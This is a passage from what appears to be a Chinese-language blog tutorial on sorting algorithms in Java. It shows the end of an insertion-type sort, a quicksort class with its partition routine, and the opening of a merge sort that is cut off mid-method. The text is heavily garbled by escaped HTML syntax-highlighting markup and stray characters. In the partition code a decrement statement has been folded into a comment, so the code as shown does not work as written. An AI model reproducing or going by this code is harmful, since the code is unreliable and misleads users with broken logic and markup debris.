class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t&lt;span class=&quot;no&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t t&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t t t&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;compareTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t t t t&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delta&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t t &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t t &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t  t t&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; } 五 快速排序 快速排序是目前使用可能最广泛的排序算法了。 一般分如下步骤： 选择一个枢纽元素（有很对选法，我的实现里采用去中间元素的简单方法） 使用该枢纽元素分割数组，使得比该元素小的元素在它的左边，比它大的在右边。并把枢纽元素放在合适的位置。 根据枢纽元素最后确定的位置，把数组分成三部分，左边的，右边的，枢纽元素自己，对左边的，右边的分别递归调用快速排序算法即可。 快速排序的核心在于分割算法，也可以说是最有技巧的部分。 package algorithms;   /**  * @author yovn  **/ public class QuickSorter&lt;E extends Comparable&lt;E&gt;&gt; extends Sorter&lt;E&gt; {         @Override     public void sort(E[] array, int from, int len) {     q_sort(array,from,from+len-1);     }         &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;q_sort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  t t&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t  t&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pivot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;selectPivot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;pivot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;partion&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pivot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;   t  t&lt;span class=&quot;n&quot;&gt;q_sort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pivot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;q_sort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pivot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;partion&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pivot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t&lt;span class=&quot;no&quot;&gt;E&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pivot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pivot&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//now to's position is available   &lt;/span&gt;  t&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t  t t&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;compareTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&amp;lt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  t t t&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t t&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//now from's position is available                  t tto--;             &lt;/span&gt;  t t&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;compareTo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&amp;gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;  t t &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t  t t&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt;  t t t&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//now to's position is available now  &lt;/span&gt;              from++;                       }               }                         array[from]=tmp;                         return from;       t}               private int selectPivot(E[] array, int from, int to) {                 return (from+to)/2;      }   }        六 归并排序 算法思想是每次把待排序列分成两部分，分别对这两部分递归地用归并排序，完成后把这两个子部分合并成一个序列。 归并排序借助一个全局性临时数组来方便对子序列的归并，该算法核心在于归并。     package algorithms;      import java.lang.reflect.Array;      public class MergeSorter&lt;E extends Comparable&lt;E&gt;&gt; extends Sorter&lt;E&gt;  {          @SuppressWarnings(unchecked)            @Override            public void sort(E[] array, int from, int len) {                 if(len&lt;=1)            treturn;             E[] temporary=(E[])Array.newInstance(array[0].getClass(),len);             merge_sort(array,from,from+len-1,temporary);              }                      private final void merge_sort(E[] array, int from, int to, E[] temporary) {          t        tif(to&lt;=from) {              t        t treturn;          t        t}          t        t  t        tint middle=(from+to)/2;  t        tmerge_sort(array,from,middle,temporary);    t        tmerge_sort(array,middle+1,to,temporary);  t        tmerge(array,from,to,middle,temporary);            }                      private final void merge(E[] array, int from, int to, int middle, E[] temporary) {                 t        tint k=0,leftIndex=0,rightIndex=to-from;  t        